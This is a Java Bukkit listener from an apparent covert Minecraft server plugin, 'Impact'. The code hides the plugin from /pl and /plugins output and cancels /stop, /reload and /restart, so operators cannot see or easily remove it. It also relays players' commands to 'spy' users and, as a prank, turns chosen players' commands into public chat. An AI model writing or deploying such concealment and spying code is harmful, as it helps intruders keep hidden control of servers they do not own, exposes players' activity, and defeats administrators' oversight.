package de.impact.listeners;

import de.impact.commands.player.CommandSpy;
import de.impact.commands.trolling.FailCommand;
import de.impact.utils.ChatUtils;
import de.impact.utils.Locks;
import de.impact.utils.PluginUtils;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.util.UUID;

public class CommandListener implements Listener {

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent e) {

        String msg = e.getMessage().toUpperCase();

        if(Locks.COMMANDS.isLocked())
            e.setCancelled(true);

        if(Locks.PLUGINLIST.isLocked() && (msg.startsWith("/PL") || msg.startsWith("/PLUGINS") || msg.startsWith("/BUKKIT:PLUGINS") || msg.startsWith("/BUKKIT:PL"))) {
            e.setCancelled(true);
            e.getPlayer().sendMessage(PluginUtils.getPluginListExceptImpact());
        }

        if(Locks.STOP.isLocked() && (msg.startsWith("/STOP") || msg.startsWith("/RL") || msg.startsWith("/RELOAD") || msg.startsWith("/RESTART") || msg.startsWith("/BUKKIT:RL") || msg.startsWith("/BUKKIT:RELOAD"))) {
            e.setCancelled(true);
        }

        if(FailCommand.shouldFail(e.getPlayer().getUniqueId())) {
            e.setCancelled(true);
            e.getPlayer().chat(e.getMessage().replaceFirst("/", "7"));
            return;
        }

        for(UUID p : CommandSpy.getSpyPlayers()) {

            if(Bukkit.getPlayer(p) == null || Bukkit.getPlayer(p).equals(e.getPlayer())) continue;

            ChatUtils.sendMessage(Bukkit.getPlayer(p), e.getPlayer().getName() + " has ran a command: §a" + e.getMessage());
        }

    }
}
